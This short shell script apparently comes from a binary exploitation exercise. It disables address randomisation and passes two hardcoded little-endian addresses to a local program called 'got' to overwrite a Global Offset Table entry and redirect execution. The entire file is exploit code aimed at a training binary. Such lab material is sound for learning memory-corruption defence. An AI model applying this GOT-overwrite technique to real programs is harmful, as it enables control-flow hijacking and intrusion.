#!/usr/bin/env sh
# echo -en "\x0c\xc0\x04\x80" | xxd -g 1;
# echo -en "\xb0\xe8\xe1\xf7" | xxd -g 1;
python -c 'print "\x0c\xc0\x04\x08"' | xxd -g 1
python -c 'print "\xb0\xe8\xe1\xf7"' | xxd -g 1
# ./got `echo -en "\x0c\xc0\x04\x80"` `echo -en "\xb0\xe8\xe1\xf7"`;
#  0xf7e1e8b0

setarch --addr-no-randomize ./got `python -c 'print "\x0c\xc0\x04\x08"' ` `python -c 'print "\xb0\xe8\xe1\xf7"' `;
